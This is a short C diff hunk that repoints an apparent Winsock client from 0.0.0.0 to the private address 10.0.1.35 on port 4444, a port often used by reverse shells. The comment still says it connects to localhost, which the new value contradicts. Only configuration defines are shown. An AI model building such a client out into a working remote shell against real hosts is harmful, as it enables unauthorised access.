@@ -4,7 +4,7 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-#define SERVER_IP "0.0.0.0" // Connects to localhost
+#define SERVER_IP "10.0.1.35" // Connects to localhost
 #define SERVER_PORT 4444    // Port to connect to
 #define DEFAULT_BUFLEN 1024
 
